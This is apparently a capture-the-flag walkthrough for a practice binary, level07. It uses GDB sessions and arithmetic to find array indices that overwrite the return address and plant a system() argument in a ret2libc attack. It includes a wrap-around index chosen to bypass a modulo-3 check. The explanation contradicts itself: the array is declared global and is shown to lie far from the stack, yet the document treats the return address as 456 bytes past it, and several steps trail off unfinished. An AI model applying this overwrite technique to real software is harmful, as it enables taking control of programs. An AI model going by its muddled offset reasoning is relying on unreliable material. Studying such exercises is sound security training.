# Level07: Why Index 114 for EIP and Index 116 for Argument

This document explains how to determine the correct indices (114 for EIP, 116 for argument) in level07's integer overflow exploit using GDB PEDA.

## The Vulnerability

Level07 has an **integer overflow** vulnerability in the array indexing:

```c
unsigned int array[100];  // Global array

int store_number(unsigned int number, unsigned int index) {
    if (index % 3 == 0) {
        return 1;  // Reject indices divisible by 3
    }
    array[index] = number;  // No bounds check! Integer overflow possible
    return 0;
}
```

The memory address calculation is:
```
effective_address = &array + (index * 4)
```

With a large enough index, `index * 4` can **overflow** and wrap around to point to other memory locations, including the **return address (EIP)** on the stack!

## Finding the Indices with GDB PEDA

### Step 1: Start GDB and Find the Array Address

```bash
gdb level07
gdb-peda$ break store_number
gdb-peda$ run
Input command: store
 Number: 1234
 Index: 0
```

### Step 2: Find the Array Base Address

```bash
gdb-peda$ p &array
$1 = (unsigned int (*)[100]) 0x804a040 <array>
```

**Array base address: `0x804a040`**

### Step 3: Find the Return Address (EIP) Location

Set a breakpoint at the `ret` instruction of `main`:

```bash
gdb-peda$ disas main
```

Look for the `ret` instruction at the end (e.g., `0x08048630`):

```bash
gdb-peda$ break *0x08048630
gdb-peda$ continue
Input command: quit
```

Now examine the stack pointer to find where the return address is stored:

```bash
gdb-peda$ info registers esp
esp            0xffffd6fc	0xffffd6fc

gdb-peda$ x/x $esp
0xffffd6fc:	0xf7e45513
```

**Return address (EIP) is stored at: `0xffffd6fc`**

### Step 4: Calculate the Byte Offset

Calculate the distance from the array to the return address:

```bash
gdb-peda$ p/d 0xffffd6fc - 0x804a040
$2 = -2148526404
```

Wait, that's negative! This is because the array is in the **data segment** (low address) and the stack is at a **high address**.

Let's think differently. We need to find what happens when we overflow:

```bash
gdb-peda$ p/x 0xffffd6fc - 0x804a040
$3 = 0xf7fb36bc
```

This is a huge positive number when treated as unsigned. We need to find an index that, when multiplied by 4 and added to the array base, gives us the EIP location.

### Step 5: Use Integer Overflow Math

In 32-bit systems, integers wrap around at `2^32 = 4294967296`.

We want:
```
array_base + (index * 4) = eip_location
0x804a040 + (index * 4) = 0xffffd6fc
```

Solving for index:
```
index * 4 = 0xffffd6fc - 0x804a040
index * 4 = 0xf7fb36bc (as unsigned 32-bit)
```

But we want the overflow to wrap around. Let's calculate differently:

```
index * 4 ≡ (eip_location - array_base) mod 2^32
```

### Step 6: Find the Actual Byte Offset (Easier Method)

Let's use a simpler approach. Set a breakpoint and examine memory:

```bash
gdb-peda$ break *main+XXX  # Before the return
gdb-peda$ run
Input command: quit

# Find ESP (where return address is)
gdb-peda$ x/x $esp
0xffffd6fc:	0xf7e45513

# Find array base
gdb-peda$ p &array
$1 = 0x804a040

# Calculate offset in a different way
# The stack grows downward, but we can still calculate the offset
```

Actually, let me show you the **practical method** used in the exploit:

### Step 7: The Practical Method - Trial and Error with Read

Use the `read` command to find where the return address is relative to the array:

```bash
./level07
Input command: read
 Index: 114
 Number at data[114] is 4158685459
```

Convert to hex:
```bash
gdb-peda$ p/x 4158685459
$1 = 0xf7e45513
```

This looks like a return address (in libc range)! So **index 114** points to the return address.

**Verification:**
```
Byte offset = 114 * 4 = 456 bytes
```

### Step 8: Verify with GDB

```bash
gdb-peda$ break store_number
gdb-peda$ run
Input command: store
 Number: 0xdeadbeef
 Index: 114

# This will fail because 114 % 3 == 0
# So we need to use the overflow trick
```

### Step 9: Calculate the Overflow Index

We want to write to index 114, but `114 % 3 == 0`, so it's blocked.

We need to find a large number that:
1. When multiplied by 4, overflows to give us the same offset (456 bytes)
2. When modulo 3, gives us something other than 0

**Formula:**
```
overflow_index * 4 ≡ 456 (mod 2^32)
overflow_index ≡ 114 (mod 2^32 / 4)
overflow_index ≡ 114 (mod 1073741824)
```

We can use:
```
overflow_index = 114 + 1073741824 = 1073741938
```

**Check:**
```
1073741938 * 4 = 4294967752
4294967752 mod 2^32 = 4294967752 - 4294967296 = 456 ✓
1073741938 % 3 = 1 ✓ (not 0, so allowed!)
```

### Step 10: Find the Argument Index

In a ret2libc attack, the stack layout when `system()` is called should be:

```
[ESP]     → Return address (we don't care, can be anything)
[ESP+4]   → First argument to system() (pointer to "/bin/sh")
```

Relative to the array:
- EIP is at index 114 (456 bytes)
- Return address after system is at index 115 (460 bytes)
- First argument is at index 116 (464 bytes)

**Check if index 116 is allowed:**
```
116 % 3 = 2 ✓ (not 0, so allowed!)
```

Perfect! We can write directly to index 116 without overflow.

## Summary of Calculations

| Target | Index | Byte Offset | Calculation | Modulo 3 | Method |
|--------|-------|-------------|-------------|----------|--------|
| EIP | 114 | 456 | 114 * 4 = 456 | 0 (blocked) | Need overflow |
| EIP (overflow) | 1073741938 | 456 (after overflow) | 1073741938 * 4 mod 2^32 = 456 | 1 (allowed) | Use this! |
| Argument | 116 | 464 | 116 * 4 = 464 | 2 (allowed) | Direct write |

## Step-by-Step GDB Commands to Find Indices

```bash
# 1. Find array base
gdb-peda$ p &array
$1 = 0x804a040

# 2. Run until just before return
gdb-peda$ break main
gdb-peda$ run
Input command: quit
gdb-peda$ break *<address_of_ret_instruction>
gdb-peda$ continue

# 3. Find return address location
gdb-peda$ x/x $esp
0xffffd6fc:	0xf7e45513

# 4. Calculate index (easier: use read command)
# Exit GDB and run the program normally:
./level07
Input command: read
 Index: 114
 Number at data[114] is 4158685459  # This is the return address!

# 5. Verify it's the return address
gdb-peda$ p/x 4158685459
$2 = 0xf7e45513  # Yes, it's in libc range

# 6. Calculate overflow index
# 114 % 3 == 0 (blocked)
# Use: 114 + 1073741824 = 1073741938
# Verify: 1073741938 % 3 = 1 (allowed!)

# 7. Argument is at index 116
# 116 % 3 = 2 (allowed, can write directly)
```

## Why These Specific Numbers?

- **Index 114**: Found by trial (reading different indices) or calculating stack layout
- **Index 1073741938**: Calculated as `114 + 2^30` to cause overflow while bypassing `% 3` check
- **Index 116**: EIP + 2 indices (8 bytes) = location of first argument in ret2libc

The key insight is that `2^30 = 1073741824`, and adding this to 114 gives us an index that:
1. Overflows to point to the same memory location
2. Has a different remainder when divided by 3

